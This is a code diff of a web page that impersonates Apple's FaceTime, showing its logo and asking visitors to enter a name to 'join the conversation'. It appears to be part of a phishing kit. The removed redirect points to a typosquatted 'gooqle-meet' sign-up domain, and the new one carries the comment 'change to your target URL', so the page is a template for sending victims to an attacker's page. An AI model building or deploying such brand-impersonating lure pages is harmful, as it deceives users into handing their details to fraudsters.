@@ -27,19 +27,21 @@
     }
 
     .icon {
-      width: 64px;
-      height: 64px;
-      margin: 0 auto 16px;
-      background: linear-gradient(135deg, #3cd34a, #1fae38);
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 14px;
       border-radius: 16px;
+      overflow: hidden;
       display: flex;
       align-items: center;
       justify-content: center;
+      background: transparent;
     }
 
-    .icon::before {
-      content: "📹";
-      font-size: 28px;
+    .icon img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
     }
 
     h1 {
@@ -103,7 +105,7 @@
 <body>
   <div class="container">
     <div class="icon">
-      <img src="https://raw.githubusercontent.com/emeraldperez00-cloud/images/refs/heads/main/FaceTime_iOS.svg-removebg-preview.png"
+      <img src="https://raw.githubusercontent.com/emeraldperez00-cloud/images/refs/heads/main/FaceTime_iOS.svg-removebg-preview.png" alt="FaceTime Logo">
     </div>
     <h1>FaceTime</h1>
     <p>Enter your name to join the conversation.</p>
@@ -131,7 +133,7 @@
 
       button.addEventListener('click', () => {
         if (!button.disabled) {
-          window.location.href = 'https://gooqle-meet-live-call.4-5s.com/sing-up'; // change to your target URL
+          window.location.href = 'next.html'; // change to your target URL
         }
       });
     </script>
